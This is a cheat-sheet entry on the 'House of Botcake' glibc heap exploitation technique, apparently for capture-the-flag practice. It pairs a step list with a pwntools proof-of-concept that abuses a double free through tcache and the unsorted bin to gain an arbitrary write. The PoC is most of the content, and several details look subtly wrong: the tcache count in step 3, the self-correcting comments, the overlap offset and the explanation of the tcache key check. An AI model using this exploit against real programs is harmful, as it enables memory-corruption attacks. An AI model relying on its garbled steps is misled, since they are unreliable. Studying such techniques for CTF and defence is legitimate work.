# House of Botcake

**When**: Double free needed but tcache double-free detection (glibc 2.29+) blocks it. UAF or overlapping chunk available.
**Primitive needed**: Free the same chunk via both tcache and unsorted bin paths.
**Result**: Chunk appears in both tcache and unsorted bin simultaneously → overlapping allocations.

## Mechanism
1. Fill tcache for size S (7 chunks).
2. Free chunk A → goes to unsorted bin (tcache full).
3. Free an extra tcache chunk → tcache now has 6 entries (one slot open).
4. Free chunk A again → goes to tcache (different list, no double-free detection).
5. Now A is in both unsorted bin AND tcache.
6. Allocate from unsorted bin (consolidation may occur) → get a chunk overlapping A.
7. Write a target address into A's fd.
8. Allocate from tcache → returns A, then next alloc returns target.

## PoC
```python
# IN: alloc/free/edit primitives, size S  OUT: arbitrary write
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('./libc.so.6')
p = process('./binary')

S = 0x90  # chunk size

# Step 1: Allocate 9 chunks of size S
for i in range(9):
    alloc(i, S)

# Step 2: Fill tcache (free 7 chunks)
for i in range(7):
    free(i)
# Tcache[S] is now full (7 entries)

# Step 3: Free chunk 7 → unsorted bin
free(7)

# Step 4: Free one tcache entry to make room (free chunk 8? no — alloc and free)
# Actually: free chunk 8 to consolidate with 7 in unsorted bin
free(8)
# Now chunk 7+8 are consolidated in unsorted bin

# Step 5: Take one entry out of tcache (alloc from tcache)
alloc(9, S)  # tcache now has 6 entries

# Step 6: Free chunk 7 again → goes to tcache (different path, no detection)
free(7)
# Now chunk 7 is in BOTH tcache AND the consolidated unsorted bin chunk

# Step 7: Allocate from unsorted bin (request size > S to skip tcache)
# This carves from the consolidated chunk, overlapping chunk 7
alloc(10, S + 0x10)

# Step 8: Use the overlapping allocation to overwrite chunk 7's tcache fd
edit(10, b'A' * S + p64(0) + p64(S+0x11) + p64(target_addr))
#                             ^chunk 7 header   ^fd overwrite

# Step 9: Allocate twice from tcache
alloc(11, S)     # returns chunk 7 (from tcache)
alloc(12, S)     # returns target_addr — arbitrary write!
edit(12, payload)

p.interactive()
```

## Trap
- The consolidated unsorted bin chunk must be large enough to carve a new allocation that overlaps the tcache'd chunk.
- Safe-linking (glibc 2.32+): the fd overwrite must XOR with `(chunk_addr >> 12)`.
- The double-free puts A in tcache with the same `key` value — this works because tcache double-free detection only checks if the key matches, and A was freed from unsorted bin first (different key path).
